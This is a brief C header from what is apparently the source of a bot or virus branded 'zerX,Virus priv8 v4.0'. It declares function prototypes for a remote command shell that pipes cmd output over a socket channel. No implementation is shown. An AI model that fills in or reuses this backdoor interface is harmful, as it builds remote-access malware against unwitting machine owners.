/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
#ifndef NO_REMOTECMD
void Close_Handles(void);
BOOL send_commands(char *commands);
DWORD WINAPI PipeReadThread(LPVOID param);
int pipe_send(SOCKET sock,char *chan,char *buf);
int open_cmd(SOCKET sock,char * chan);
DWORD WINAPI PipeReadThread(LPVOID param);
#endif